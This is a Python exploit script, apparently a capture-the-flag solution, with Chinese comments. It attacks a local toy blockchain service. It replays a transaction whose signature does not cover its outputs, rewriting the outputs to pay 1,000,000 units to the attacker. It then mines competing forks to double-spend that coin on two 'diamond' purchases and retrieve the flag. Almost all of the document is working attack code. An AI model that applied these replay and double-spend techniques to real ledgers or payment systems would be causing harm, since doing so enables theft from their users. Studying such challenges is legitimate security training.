import hashlib
import json
import rsa
import uuid
import requests
import time  # 用于延时，如果需要
from functools import reduce

s = requests.Session()


# 复制base code中的核心函数（必须build upon base code）
def hash(x):
    if isinstance(x, str):
        x = x.encode('utf-8')
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    result = hash(x) + hash(y)
    return hash(result)
    
EMPTY_HASH = '0' * 64

def pubkey_to_address(pubkey):
    assert pubkey.e == 65537
    hexed = hex(pubkey.n)
    if hexed.endswith('L'): hexed = hexed[:-1]
    if hexed.startswith('0x'): hexed = hexed[2:]
    return hexed

def sign_input_utxo(input_utxo_id, privkey):
    if isinstance(input_utxo_id, str):
        input_utxo_id = input_utxo_id.encode('utf-8')
    return rsa.sign(input_utxo_id, privkey, 'SHA-1').hex()

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo}
    tx['hash'] = hash_tx(tx)
    return tx

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != str: raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block

# 挖矿函数（PoW）
DIFFICULTY = int('00000' + 'f' * 59, 16)
def mine_block(prev, transactions, difficulty=DIFFICULTY, nonce_prefix=''):
    nonce = 0
    while True:
        block = create_block(prev, nonce_prefix + str(nonce), transactions)
        block_hash_int = int(block['hash'], 16)
        if block_hash_int <= difficulty:
            return block
        nonce += 1
        if nonce % 100000 == 0:
            print(f"Mining... tried {nonce} nonces")  # 进度显示

# 解析homepage文本获取信息
def parse_home(text):
    lines = text.split('<br />')  # 注意: 实际可能\r\n, 根据响应调整
    genesis_block_hash = None
    bank_address = None
    hacker_address = None
    shop_address = None
    blocks = None
    utxos = None
    for line in lines:
        if 'hash of genesis block: ' in line:
            genesis_block_hash = line.split('hash of genesis block: ')[1].strip()
        if "the bank's addr: " in line:
            parts = line.replace("the bank's addr: ", "").split(", ")
            bank_address = parts[0].split(",")[0].strip()
            hacker_address = parts[1].split(": ")[1].strip()
            shop_address = parts[2].split(": ")[1].strip()
        if 'Blockchain Explorer: ' in line:
            blockchain_str = line.split('Blockchain Explorer: ')[1].strip()
            blocks = json.loads(blockchain_str)
        if 'All utxos: ' in line:
            utxos_str = line.split('All utxos: ')[1].strip()
            utxos = json.loads(utxos_str)
    return genesis_block_hash, bank_address, hacker_address, shop_address, blocks, utxos

# 主攻击脚本
if __name__ == '__main__':
    # 替换为你的server URL（本地运行serve.py后）
    url_base = 'http://127.0.0.1:5001/b9af31f66147e'  # 选一个valid prefix

    # Step 0: 生成自己的攻击者地址和私钥
    my_pubkey, my_privkey = rsa.newkeys(384)
    my_address = pubkey_to_address(my_pubkey)
    print(f"我的地址: {my_address}")

    # Step 1: 重置链并获取初始信息
    r = s.get(url_base + '/reset')
    print("链重置: ", r.text)
    text = s.get(url_base + '/').text
    genesis_block_hash, bank_address, _, shop_address, blocks, _ = parse_home(text)
    print(f"Genesis hash: {genesis_block_hash}")

    # 找到height=1的区块（第二区块，转移tx）
    attacked_block = next(b for b in blocks.values() if b['height'] == 1)
    for b in blocks.values():
        if b['height'] == 1:
            attacked_block = b
            break

    # 重放tx，改output为1000000到my_address
    replayed_tx = json.loads(json.dumps(attacked_block['transactions'][0]))  # 深拷贝
    replayed_tx['output'] = [create_output_utxo(my_address, 1000000)]
    replayed_tx['hash'] = hash_tx(replayed_tx)
    print("重放tx准备好")

    # 调试
    print("重放交易详情:")
    print("  输入:", replayed_tx['input'])
    print("  输出:", replayed_tx['output'])

    # 挖分叉区块（prev=genesis）
    forked_block = mine_block(genesis_block_hash, [replayed_tx])

    # 调试
    print("分叉块详情:")
    print("  prev:", forked_block['prev'])
    print("  hash:", forked_block['hash'])
    print("  交易数量:", len(forked_block['transactions']))
    
    r = s.post(url_base + '/create_transaction', data=json.dumps(forked_block))
    print("分叉区块追加: ", r.text)

    # 调试
    if "unknown parent block" in r.text:
        print("错误：分叉块的父块不被认可！")
        print("确保分叉块的prev是当前的创世块哈希:", genesis_block_hash)

    # 挖2个空块，使分叉更长
    prev = forked_block['hash']
    for i in range(2):
        empty_block = mine_block(prev, [])
        r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
        print(f"空块{i+1}追加: ", r.text)
        prev = empty_block['hash']

    # 获取我的UTXO id
    text = s.get(url_base + '/').text
    _, _, _, _, blocks, utxos = parse_home(text)
    utxo_to_double_spend = next(id for id, u in utxos.items() if u['addr'] == my_address and u['amount'] == 1000000)
    print(f"我的UTXO id: {utxo_to_double_spend}")
    

    # 记录买前prev（用于后续分叉）
    fork_point_prev = prev  # 最后一个空块hash，height=3

    # Step 2: 买第一颗钻石
    output_to_shop = create_output_utxo(shop_address, 1000000)
    tx_to_shop1 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
    spend_block1 = mine_block(fork_point_prev, [tx_to_shop1]) 
    r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block1))
    print("第一笔转账: ", r.text)  # server会给diamond1，并追加cold块

    # Step 3: 分叉买第二颗钻石
    # 重新创建tx（新uuid，新hash）
    output_to_shop = create_output_utxo(shop_address, 1000000)
    tx_to_shop2 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
    spend_block2 = mine_block(fork_point_prev, [tx_to_shop2], nonce_prefix='another-chain-nonce-')
    r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block2))
    print("第二笔转账: ", r.text)

    # # 刷新获取新tail（cold块后）
    # text = s.get(url_base + '/').text
    # _, _, _, _, blocks, _ = parse_home(text)
    # tail = max(blocks.values(), key=lambda b: b['height'])
    # prev = tail['hash']

    # # 挖2个空块，使新分叉更长
    # for i in range(2):
    #     empty_block = mine_block(prev, [])
    #     r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
    #     print(f"额外空块{i+1}: ", r.text)
    #     prev = empty_block['hash']

    # 直接用第二条分支尾部延长，使其高度反超第一条链
    prev = spend_block2['hash']
    for i in range(2):  # 至少 2 个空块
        empty_block = mine_block(prev, [])
        r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
        print(f"反超空块{i+1}: ", r.text)
        prev = empty_block['hash']

    # 检查flag
    r = s.get(url_base + '/flag')
    print("Flag: ", r.text)